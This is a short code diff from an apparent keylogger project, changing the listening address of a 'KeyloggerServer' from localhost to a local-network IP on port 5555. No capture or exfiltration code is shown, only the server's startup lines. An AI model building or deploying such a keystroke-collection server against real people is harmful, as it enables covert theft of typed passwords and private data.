@@ -42,5 +42,5 @@ class KeyloggerServer():
             thread.start()
 
 if __name__ == '__main__':
-    server = KeyloggerServer('127.0.0.1', 5555)
+    server = KeyloggerServer('192.168.18.163', 5555)
     server.run()
